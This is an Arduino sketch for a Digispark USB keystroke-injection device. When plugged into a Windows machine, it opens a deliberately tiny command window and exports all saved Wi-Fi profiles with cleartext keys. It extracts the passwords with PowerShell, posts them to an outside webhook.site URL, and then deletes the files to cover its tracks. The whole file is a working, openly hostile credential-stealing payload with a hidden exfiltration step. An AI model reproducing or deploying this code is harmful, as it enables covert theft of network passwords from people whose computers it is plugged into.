#include "DigiKeyboardPtBr.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboardPtBr.update();
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(3000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.delay(500); 
  DigiKeyboardPtBr.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.delay(500); 
  DigiKeyboardPtBr.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboardPtBr.delay(300);  
  DigiKeyboardPtBr.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboardPtBr.delay(500); 
  DigiKeyboardPtBr.delay(500);  
  DigiKeyboardPtBr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.delay(500);   
  DigiKeyboardPtBr.println("powershell Invoke-WebRequest -Uri https://webhook.site/f7fb8d45-4cfd-4814-8a00-7178cea57631 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  //DigiKeyboardPtBr.println("[]{}\\|;:',./<>?");
  DigiKeyboardPtBr.delay(1000);  
  DigiKeyboardPtBr.delay(500); 
  DigiKeyboardPtBr.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboardPtBr.delay(500); 
  DigiKeyboardPtBr.delay(500);  
  //DigiKeyboard.println("exit");
  DigiKeyboardPtBr.delay(100); 
  DigiKeyboardPtBr.delay(500);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboardPtBr.delay(90000);
  DigiKeyboardPtBr.delay(500); 
  digitalWrite(1, LOW); 
  DigiKeyboardPtBr.delay(5000);
  
}
